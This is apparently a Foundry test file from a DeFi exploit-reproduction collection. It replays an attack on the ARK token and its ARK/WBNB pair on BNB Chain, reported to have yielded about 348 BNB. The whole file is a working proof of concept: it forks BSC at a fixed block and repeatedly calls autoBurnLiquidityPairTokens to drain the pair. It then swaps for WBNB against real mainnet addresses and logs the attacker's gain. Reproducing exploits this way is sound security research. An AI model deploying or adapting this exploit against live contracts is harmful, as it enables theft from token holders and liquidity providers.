// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
// TX : https://phalcon.blocksec.com/explorer/tx/bsc/0xe8b0131fa14d0a96327f6b5690159ffa7650d66376db87366ba78d91f17cd677
// GUY : https://twitter.com/Phalcon_xyz/status/1771728823534375249
// Profit : ~348BNB
// REASON : business logic flaw

interface Ark is IERC20 {

    function autoBurnLiquidityPairTokens() external;

}

contract ContractTest is Test {

    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Ark constant ARK = Ark(0xde698B5BBb4A12DDf2261BbdF8e034af34399999);
    IUniswapV2Pair ARK_WBNB = IUniswapV2Pair(0xc0F54B8755DAF1Fd78933335EfCD761e3D5B4a6F);
    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    function setUp() external {
        vm.createSelectFork("bsc", 37_221_235);
        // explotier have
        deal(address(WBNB), address(this), 100);
        deal(address(ARK), address(this), 4 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        uint256 i = 0;
        while (i < 10_000) {
            ARK.autoBurnLiquidityPairTokens();
            if (ARK.balanceOf(address(ARK_WBNB)) < 1_700_000_000_000) {
                break;
            }
            i++;
        }
        WBNB.transfer(address(ARK_WBNB), 100);
        ARK.transfer(address(ARK_WBNB), ARK.balanceOf(address(this)));
        (uint256 _reserve0, uint256 _reserve1,) = ARK_WBNB.getReserves();
        uint256 Ark_balance = ARK.balanceOf(address(ARK_WBNB));
        address[] memory path = new address[](2);
        path[0] = address(ARK);
        path[1] = address(WBNB);
        uint256[] memory amountOut = router.getAmountsOut(Ark_balance - _reserve1, path);
        ARK_WBNB.swap(amountOut[1], 0, address(this), "");
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
    }

}
